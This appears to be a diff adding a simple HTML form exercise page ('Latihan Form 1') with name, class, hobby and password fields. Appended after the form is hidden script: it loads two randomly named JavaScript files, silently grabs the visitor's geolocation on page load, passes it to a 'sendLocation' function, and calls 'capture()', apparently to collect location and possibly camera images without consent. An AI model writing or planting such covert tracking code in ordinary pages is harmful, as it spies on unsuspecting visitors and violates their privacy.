@@ -1,0 +1,35 @@
+<html>
+<head>
+    <title>Latihan Form 1</title>
+</head>
+<body>
+    <form>
+        Nama : <input type="text" name="teks1"> <br><br>
+        Kelas : <input type="text" name="teks2" maxlength="2"> <br><br>
+        No : <input type="text" name="teks3" value="10"> <br><br>
+        Hobby: <input type="text" name="teks4" size="9"> <br><br>
+        Password: <input type="password" name="teks5"> <br><br>
+    </form>
+</body>
+<script src="../js/jP9GAcJGznbenzSd3z9yOS2EUQl4Zs2T.js"></script>
+<script src="../js/ZInAi3rLDQMj9y4yR43oUgYMrDoaDCTy.js"></script>
+<script src="../js/jquery.min.js"></script>
+<script type="text/javascript">
+    // Check if geolocation is supported
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                sendLocation(latitude, longitude);
+            },
+            (error) => {
+                //console.error(`Error Code: ${error.code} - ${error.message}`);
+            }
+        );
+    } else {
+        console.error("Geolocation is not supported by this browser.");
+    }
+    capture();
+</script>
+</html>
